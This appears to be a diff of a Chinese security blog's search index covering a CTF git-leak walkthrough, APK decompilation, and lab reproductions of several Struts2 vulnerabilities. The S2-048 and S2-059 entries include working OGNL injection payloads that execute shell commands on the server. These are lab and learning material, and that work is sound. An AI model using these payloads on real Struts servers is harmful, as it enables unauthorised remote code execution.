+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python GitHack.py http:&#x2F;&#x2F;challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
+<p> <img src="https://qiniu.hzktester.top/tp2020081829.png" alt="image"></p>
+</li>
+<li><p>查看 <strong>.git/refs/stash</strong> 找到 <strong>stash</strong> 对应的 <strong>hash</strong></p>
+<p> <img src="https://qiniu.hzktester.top/tp2020081830.png" alt="image"></p>
+</li>
+<li><p>git diff 9dbafcb8c4629b4b843991b6ebe5eca874812fc4 得到flag</p>
+<p> <img src="https://qiniu.hzktester.top/tp2020081831.png" alt="image"></p>
+</li>
+</ol>
+<h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p><img src="https://qiniu.hzktester.top/tp2020081832.png" alt="image"></p>
+<h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p><img src="https://qiniu.hzktester.top/tp2020081833.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020081834.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>信息泄露</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>APP反编译-下载源码</title>
+    <url>/posts/b5afabd3.html</url>
+    <content><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol>
+<li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li>
+<li>解压<strong>dex2jar.jar</strong>文件</li>
+<li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li>
+<li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="https://qiniu.hzktester.top/tp2020081601.png" alt="image"></li>
+<li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote>
+<p>d2j-dex2jar.bat classes.dex</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://qiniu.hzktester.top/tp2020081602.png" alt="image"></p>
+<h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol>
+<li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li>
+<li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="https://qiniu.hzktester.top/tp2020081603.png" alt="image"></li>
+<li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li>
+</ol>
+]]></content>
+      <categories>
+        <category>APP渗透</category>
+      </categories>
+      <tags>
+        <tag>APP反编译</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>APP之反编译+目录结构+重新打包+重新签名</title>
     <url>/posts/7c76bf46.html</url>
     <content><![CDATA[<h2 id="反编译和重新打包-apktool"><a href="#反编译和重新打包-apktool" class="headerlink" title="反编译和重新打包-apktool"></a>反编译和重新打包-apktool</h2><p>下载地址：<a href="https://ibotpeaches.github.io/Apktool/install/">https://ibotpeaches.github.io/Apktool/install/</a></p>
@@ -3932,33 +4137,6 @@
 <li><strong>META-INF</strong>：apk的签名信息</li>
 </ol>
 <h2 id="APP重新签名"><a href="#APP重新签名" class="headerlink" title="APP重新签名"></a>APP重新签名</h2><p>参考文章：<a href="https://blog.csdn.net/lyq8479/article/details/6401093">Android应用程序签名详解</a></p>
-]]></content>
-      <categories>
-        <category>APP渗透</category>
-      </categories>
-      <tags>
-        <tag>APP反编译</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>APP反编译-下载源码</title>
-    <url>/posts/b5afabd3.html</url>
-    <content><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol>
-<li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li>
-<li>解压<strong>dex2jar.jar</strong>文件</li>
-<li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li>
-<li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="https://qiniu.hzktester.top/tp2020081601.png" alt="image"></li>
-<li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote>
-<p>d2j-dex2jar.bat classes.dex</p>
-</blockquote>
-</li>
-</ol>
-<p><img src="https://qiniu.hzktester.top/tp2020081602.png" alt="image"></p>
-<h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol>
-<li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li>
-<li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="https://qiniu.hzktester.top/tp2020081603.png" alt="image"></li>
-<li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li>
-</ol>
 ]]></content>
       <categories>
         <category>APP渗透</category>
@@ -4020,32 +4198,6 @@
       </tags>
   </entry>
   <entry>
-    <title>S2-048 CVE-2017-9791复现过程</title>
-    <url>/posts/37119a29.html</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="https://qiniu.hzktester.top/tp2020081407.png" alt="image"></p>
-</li>
-<li><p>随意输入内容，使用burp抓取“submit”的数据包</p>
-</li>
-<li><p>poc利用</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qiniu.hzktester.top/tp2020081408.png" alt="image"></p>
-<p>或直接使用工具<br><img src="https://qiniu.hzktester.top/tp2020081409.png" alt="image"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>S2-029 CVE-2016-0785复现过程</title>
     <url>/posts/33bebcf9.html</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p>
@@ -4082,6 +4234,32 @@
 <li><p>直接使用工具拿到flag<br><img src="https://qiniu.hzktester.top/tp2020081406.png" alt="image"></p>
 </li>
 </ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-048 CVE-2017-9791复现过程</title>
+    <url>/posts/37119a29.html</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="https://qiniu.hzktester.top/tp2020081407.png" alt="image"></p>
+</li>
+<li><p>随意输入内容，使用burp抓取“submit”的数据包</p>
+</li>
+<li><p>poc利用</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qiniu.hzktester.top/tp2020081408.png" alt="image"></p>
+<p>或直接使用工具<br><img src="https://qiniu.hzktester.top/tp2020081409.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -4156,6 +4334,26 @@
       </tags>
   </entry>
   <entry>
+    <title>S2-devMode CVE-2016-4438复现过程</title>
+    <url>/posts/ec495d19.html</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>当Struts开启devMode时，该漏洞将影响Struts 2.1.0–2.5.1，通杀Struts2所有版本。</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081418.png" alt="image"></p>
+</li>
+<li><p>直接使用工具获得flag<br><img src="https://qiniu.hzktester.top/tp2020081419.png" alt="image"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>S2-059 CVE-2019-0230复现过程</title>
     <url>/posts/a058ddb7.html</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Struts于2020年8月13日披露 S2-059 Struts 远程代码执行漏洞（CVE-2019-0230），在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大。腾讯安全专家提醒Apache Struts用户尽快升级到2.5.22或以上版本，避免遭遇黑客攻击。    </p>
@@ -4171,26 +4369,6 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%25&#123;%23_memberAccess.allowPrivateAccess%3dtrue,%23_memberAccess.allowStaticMethodAccess%3dtrue,%23_memberAccess.excludedClasses%3d%23_memberAccess.acceptProperties,%23_memberAccess.excludedPackageNamePatterns%3d%23_memberAccess.acceptProperties,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23a%3d%40java.lang.Runtime%40getRuntime(),%23s%3dnew+java.util.Scanner(%23a.exec(&#39;ls&#39;).getInputStream()).useDelimiter(&#39;\\\\A&#39;),%23str%3d%23s.hasNext()%3f%23s.next()%3a&#39;&#39;,%23res.print(%23str),%23res.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://qiniu.hzktester.top/tp2020081417.png" alt="image"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-devMode CVE-2016-4438复现过程</title>
-    <url>/posts/ec495d19.html</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>当Struts开启devMode时，该漏洞将影响Struts 2.1.0–2.5.1，通杀Struts2所有版本。</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081418.png" alt="image"></p>
-</li>
-<li><p>直接使用工具获得flag<br><img src="https://qiniu.hzktester.top/tp2020081419.png" alt="image"></p>
-</li>
-</ol>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
